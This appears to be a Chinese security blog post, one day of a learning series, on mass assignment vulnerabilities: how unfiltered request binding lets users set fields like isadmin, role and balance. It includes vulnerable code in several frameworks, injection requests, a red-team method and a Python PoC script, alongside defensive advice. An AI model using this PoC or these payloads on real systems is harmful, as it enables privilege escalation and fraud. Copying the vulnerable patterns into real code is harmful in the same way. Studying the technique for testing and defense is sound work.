#  Mass Assignment 批量赋值漏洞：把普通用户悄悄升成管理员  
原创 Red Hunter
                    Red Hunter  黑白之道   2026-10-09 00:40  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6OhmH7iaNA2ibMm7XkoScm67e1L4VErbxSbohvAQjFZ7WB2iauNVGRD9L2jpk0DhDdbRz1NPwpzDDS2dvlLf7MH3dXnuhicbS6WnwY/640?from=appmsg "")  
> **导语**  
：最经典的越权漏洞，往往不是 SQL 注入、也不是 ID 替换，而是 API 把客户端字段一股脑塞进数据库对象。Mass Assignment 在 Ruby on Rails、NodeJS、Spring MVC、ASP.NET MVC、PHP 框架里都有不同名字，原理一模一样，危害一样大。  
  
## 一、漏洞原理  
### 1.1 一句话概括  
  
服务端在接收 HTTP 请求后，把请求里的字段批量映射（bind）到数据模型对象里，没做白名单过滤，攻击者就能夹带“本不该由前端控制的字段”，比如 isadmin  
、role  
、balance  
、verified  
。  
### 1.2 典型代码结构  
  
后端把 req.body  
 直接展开塞进模型，类似：  
```
// Node.js + Sequelize 危险写法User.create(req.body);
```  
```
# Ruby on Rails 危险写法User.new(params[:user])
```  
```
# Django REST framework 危险写法（默认全部字段都接受）serializer = UserSerializer(data=request.data)serializer.save()
```  
  
只要攻击者在请求里追加 isadmin=1  
 或者 role=admin  
，这些字段就会和正常字段一起被写入数据库。  
  
![Mass Assignment 注入示意图](https://mmbiz.qpic.cn/mmbiz_png/nGzNudUIJ6MSueZQfMBjVs6wqvRZeRkFXOusmwMXmFT9CzA4ufxsnNibhpcuwQyU96k2RD40fjZZagD1Jbd4Bvvo9XAKQDEE1vVbOalMEaB4/640?from=appmsg "Mass Assignment 注入示意图")  
## 二、攻击场景  
### 2.1 经典示例  
  
正常请求：  
```
POST /api/userinfousername=harsh
```  
  
正常响应：  
```
200 OK{"username":"harsh","isadmin":false,"email":"harsh@harshbothra.tech"}
```  
  
攻击者在请求里追加一个字段：  
```
POST /api/userinfousername=harsh&isadmin=true
```  
  
服务端不假思索把 isadmin=true  
 一起绑定，响应变成：  
```
200 OK{"username":"harsh","isadmin":true,"email":"harsh@harshbothra.tech"}
```  
  
UI 上刷新一下，这个普通账号已经悄悄变成管理员。一次请求，越权完成。  
### 2.2 进阶用法：覆盖敏感字段  
  
不只是 isadmin  
，所有敏感字段都可以被覆盖。常见高价值字段列表：  
- 角色字段：role  
、isadmin  
、is_staff  
、level  
  
- 财务字段：balance  
、credit  
、points  
、vip_expire_at  
  
- 验证状态：email_verified  
、phone_verified  
、kyc_status  
  
- 安全字段：mfa_enabled  
、password_changed_at  
、api_key  
  
- 业务字段：subscription_plan  
、quota  
、referrer_id  
  
这些字段通常前端不会渲染，也就不会被发现。但只要响应里出现过，攻击者照着塞回去就行。  
## 三、各框架里的别名  
  
Mass Assignment 在不同语言里名字不一样，审计代码时要注意对应：  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">框架/语言</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">别名</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">典型危险写法</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Ruby on Rails</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Mass Assignment</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">User.new(params[:user])</span></code></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">NodeJS (Sequelize/Mongoose)</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Mass Assignment</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">User.create(req.body)</span></code></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Spring MVC</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Auto Binding</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">@ModelAttribute User user</span></code></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">ASP.NET MVC</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Auto Binding</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">UpdateModel(user)</span></code></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">PHP (Laravel/Eloquent)</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Object Injection / Mass Assignment</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">User::create($request-&gt;all())</span></code></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Django REST framework</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">隐式绑定（默认行为）</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">serializer.save()</span></code></td></tr></tbody></table>  
名字不同，本质相同：把外部输入直接喂进对象构造器或 ORM。  
## 四、红队测试四步法  
### 4.1 抓包  
  
用 Burp Suite、Caido、mitmproxy 抓所有写操作（POST/PUT/PATCH）。重点关注：注册、修改资料、提交订单、上传文件、绑定银行卡。  
### 4.2 枚举响应字段  
  
观察正常响应里出现的字段名。Vue/React 单页应用往往会把整个对象 dump 回前端，这就是字段字典。  
### 4.3 注入测试  
  
把所有敏感字段挑出来，挨个塞进请求体，挨个测试。常用工具：  
- Burp Suite 的 Match & Replace  
 + Repeater  
  
- Caido 的 Forge  
 模块  
  
- 自写脚本批量发包  
  
### 4.4 验证落地  
  
请求发完后，立刻刷新页面或调一次 GET 接口，确认字段值真的被服务端接受并落库。只有响应里返回新值还不够，必须看到数据库侧真的写进去，才算利用成功。  
## 五、能拿到的战果  
### 5.1 认证绕过  
  
部分 OTP 接口会把 success=true  
 写进对象。攻击者提交错验证码的同时塞一个 success=true  
，校验逻辑直接被绕过，二次验证形同虚设。  
### 5.2 垂直越权  
  
普通用户把自己提到 admin、superadmin、root。后续可访问管理后台、审批工单、改他人资料，危害极广。  
### 5.3 财务篡改  
  
电商、积分、订阅类系统最容易中招。改 balance  
、credit  
、vip_expire_at  
 可以免费充会员、刷积分、改订单金额。Stripe 早期就因为这类问题出过事故。  
### 5.4 审核绕过  
  
注册审核、KYC、风控标记这些字段，前端通常不暴露，但响应里往往会回显。攻击者直接把 kyc_status=approved  
、risk_level=low  
 写进请求，绕过风控。  
### 5.5 横向越权  
  
把字段值改成别的用户 ID（如 referrer_id=10086  
），还能配合 IDOR 做横向提权。  
## 六、PoC 示例（Python requests）  
```
import requestsBASE = "https://target.example.com"s = requests.Session()# 1. 登录普通账号s.post(f"{BASE}/api/login", json={    "username": "lowuser",    "password": "P@ssw0rd!"})# 2. 正常抓取个人资料me = s.get(f"{BASE}/api/userinfo").json()print("原始字段：", list(me.keys()))# 3. 注入 isadmin、role、balance 等敏感字段payload = dict(me)  # 保留所有原始字段payload["isadmin"] = Truepayload["role"] = "superadmin"payload["balance"] = 9999999r = s.post(f"{BASE}/api/userinfo", json=payload)print("升级响应：", r.json())# 4. 验证是否真的成为 adminadmin = s.get(f"{BASE}/api/admin/ping")print("管理后台可达：", admin.status_code == 200)
```  
  
跑完这三步，如果第 4 步返回 200，说明这套接口的 Mass Assignment 已经拿下。  
## 七、真实案例  
- **GitHub 2012**  
：Rails 的 User.update_attributes  
 没过滤 public_key  
 字段，攻击者可以塞 SSH 公钥进任意账号，直接免密登录服务器。  
  
- **Facebook 多个 Bounty**  
：信息流广告接口里 is_admin  
 字段被覆盖，能进入内部广告管理面板。  
  
- **HackerOne #99424**  
：某社交平台 /api/profile  
 接受 is_staff=true  
，普通用户秒变运营。  
  
- **某电商平台（公开报告）**  
：结算接口接受 coupon_id  
 同时允许覆盖 discount_amount  
，直接免单。  
  
这些案例的共同点：服务端没做白名单，前端不显示，攻击者靠抓响应字段发现入口。  
  
![Mass Assignment 攻击流程图](https://mmbiz.qpic.cn/mmbiz_png/nGzNudUIJ6OrUibU3JhibZ0sR2QEIMl4a1jWgVCnWIA4GzuSibEP1xpnXf0fBgTpbKseOPFk45nR5UZRYruK6bMypXrgXuibdA4d94Iib5eIgSvw/640?from=appmsg "Mass Assignment 攻击流程图")  
## 八、防御要点  
### 8.1 白名单字段  
  
后端只接受明确允许的字段，其他全部丢弃。Rails 用 attr_accessible  
 或 Strong Parameters；Django 用 Meta.fields  
 显式声明；NodeJS 自己写 pick 工具函数。  
### 8.2 DTO / ViewModel  
  
不要把 ORM 模型直接暴露给 HTTP 层。中间加一层 DTO，由 DTO 控制哪些字段可写、哪些只读。  
### 8.3 拒绝“响应即字典”  
  
接口响应里不返回不该由用户控制的字段（如 isadmin  
、password_hash  
），避免给攻击者提供字段字典。  
### 8.4 关键字段二次校验  
  
即使前端允许修改 email  
，也要校验是否已验证、是否唯一。isadmin  
 这种字段，永远不应该出现在写接口的入参里。  
### 8.5 自动化检测  
  
把 Mass Assignment 加入 CI 流程：用 Semgrep、CodeQL 规则扫 User.create(req.body)  
 这类危险调用；用 DAST 工具（Burp Scanner、Caido、StackHawk）做接口层 fuzz。  
## 九、红队实战建议  
1. 测注册、改资料、上传三类接口，90% 的 Mass Assignment 出现在这三种端点里。  
  
1. 关注 GraphQL 接口，GraphQL 的 input  
 类型如果没显式定义字段，等于把所有字段都暴露，更容易中招。  
  
1. 配合 IDOR 用，垂直越权 + 横向越权组合拳，杀伤力翻倍。  
  
1. 拿到一次 PoC 就停手，立即提交报告。这类漏洞影响面大、修复快，越早提交越值钱。  
  
## 十、思考题  
1. 如果一个 API 把所有字段都做了白名单，但允许 PUT /api/users/:id  
，还存在 Mass Assignment 风险吗？  
  
1. GraphQL 的 input  
 类型跟 REST 的 request body 在 Mass Assignment 上有什么区别？  
  
1. PATCH /api/me  
 这种只允许改部分字段的接口，怎么测才能避免漏报？  
  
下一篇预告：day19《OAuth Misconfiguration》。  
  
**素材出处**  
- learn365 day18「Mass Assignment Attack」原文  
  
- OWASP Mass Assignment Cheat Sheet  
  
- VirtueSecurity KB「API Mass Assignment」  
  
- HackerOne 报告 #99424  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6NQCiaag9R44XsYB3Ej9bR8icSG4nicTy6Mo55m8fRa8Dib5calGsqHaGhv3dd9BPabCkQFhmlbCZaDnzE2HLuG8CPSqCryFKe0hL8/640?from=appmsg "")  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621549&idx=1&sn=21c4b072726d2387d562109ada6b9bbb&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621944&idx=1&sn=3cc6dc9876a20466d4ec3634deb80220&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650622065&idx=1&sn=09f8ae84c06d4331e71c277b177ae701&scene=21#wechat_redirect)  
> 👇 点击**阅读原文**  
，访问我的网站  
  
  
